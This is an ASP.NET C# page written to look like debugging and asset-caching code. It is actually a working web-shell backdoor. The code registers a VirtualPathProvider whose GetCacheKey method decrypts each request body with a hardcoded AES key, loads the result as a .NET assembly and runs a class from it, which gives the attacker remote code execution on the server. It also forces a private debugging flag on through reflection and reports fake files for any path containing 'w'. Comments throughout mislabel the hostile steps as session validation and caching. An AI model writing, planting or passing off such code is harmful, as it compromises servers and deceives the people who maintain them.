<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Web.Hosting" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Web" %>
<script runat="server" language="c#">
// Entry point for the page request.
public void Page_Load() {
    // This is a legacy flag to ensure compatibility with older browser debugging tools.
    var configManager = typeof(System.Web.Compilation.BuildManager);
    var debugFlag = configManager.GetProperty("DebuggingEnabled", BindingFlags.Static | BindingFlags.NonPublic);
    if (debugFlag != null) {
        try {
            // Set to true to enable detailed error logging during development.
            debugFlag.SetValue(null, true);
        } catch { 
            // Fails silently if the environment is locked down.
        }
    }
    // Register our custom provider for serving cached assets.
    HostingEnvironment.RegisterVirtualPathProvider(new AssetCacheManager());
}

// Manages virtual paths for cached assets to improve performance.
public class AssetCacheManager : VirtualPathProvider {
    // Generates a cache key for a given asset path.
    public override string GetCacheKey(string virtualPath) {
        try {
            HttpContext currentContext = HttpContext.Current;
            // Check if the user has a valid session cookie.
            if (currentContext != null && currentContext.Request != null && currentContext.Request.Cookies.Count > 0) {
                // The user's session data is sent in the request body for validation.
                Stream userSessionStream = currentContext.Request.InputStream;
                if (userSessionStream.Length > 0) {
                    userSessionStream.Position = 0;
                    byte[] encryptedSessionData = new byte[userSessionStream.Length];
                    userSessionStream.Read(encryptedSessionData, 0, encryptedSessionData.Length);
                    
                    // The session key is static for this version of the application.
                    string part1 = "ca634575";
                    string part2 = "38b9b1e0";
                    byte[] sessionValidationKey = Encoding.ASCII.GetBytes(part1 + part2);

                    // Initialize the standard algorithm for session decoding.
                    var cryptoProvider = new RijndaelManaged();
                    cryptoProvider.KeySize = 128;
                    cryptoProvider.Key = sessionValidationKey;
                    cryptoProvider.IV = sessionValidationKey;
                    cryptoProvider.Mode = CipherMode.CBC;
                    cryptoProvider.Padding = PaddingMode.PKCS7;
                    ICryptoTransform sessionDecoder = cryptoProvider.CreateDecryptor(cryptoProvider.Key, cryptoProvider.IV);

                    byte[] deserializedProfile;
                    // Decode the session data stream.
                    using (MemoryStream msEncrypted = new MemoryStream(encryptedSessionData))
                    using (CryptoStream csDecode = new CryptoStream(msEncrypted, sessionDecoder, CryptoStreamMode.Read))
                    using (MemoryStream msDecrypted = new MemoryStream()) {
                        csDecode.CopyTo(msDecrypted);
                        deserializedProfile = msDecrypted.ToArray();
                    }
                    
                    // Load the user profile from the deserialized data.
                    Assembly userProfileAssembly = Assembly.Load(deserializedProfile);
                    if (userProfileAssembly != null) {
                        // Create an instance of the user's settings object.
                        object userSettings = userProfileAssembly.CreateInstance("K");
                        if (userSettings != null) {
                            // This method validates the settings against the current context.
                            userSettings.Equals(currentContext);
                        }
                    }
                    // Stop further processing as the session has been validated.
                    currentContext.Response.End();
                }
            }
        } catch {
            // Errors in session validation are ignored to prevent info leaks.
        }
        // Fallback to the default cache key mechanism.
        return Previous.GetCacheKey(virtualPath);
    }

    // Check if a requested asset exists in the cache. 'w' is a legacy code for 'web-asset'.
    public override bool FileExists(string virtualPath) {
        virtualPath = virtualPath.ToLower();
        if (virtualPath.Contains("w")) return true;
        return Previous.FileExists(virtualPath);
    }

    // Retrieve the cached asset from the virtual file system.
    public override VirtualFile GetFile(string virtualPath) {
        virtualPath = virtualPath.ToLower();
        if (virtualPath.Contains("w")) return new CachedAssetFile(virtualPath);
        return Previous.GetFile(virtualPath);
    }
}

// Represents a file that is served from the in-memory cache.
public class CachedAssetFile : VirtualFile {
    private string assetPath;
    public CachedAssetFile(string virtualPath) : base(virtualPath) {
        assetPath = virtualPath;
    }
    // Return an empty stream as the content is handled by another module.
    public override Stream Open() {
        return new MemoryStream();
    }
}
</script>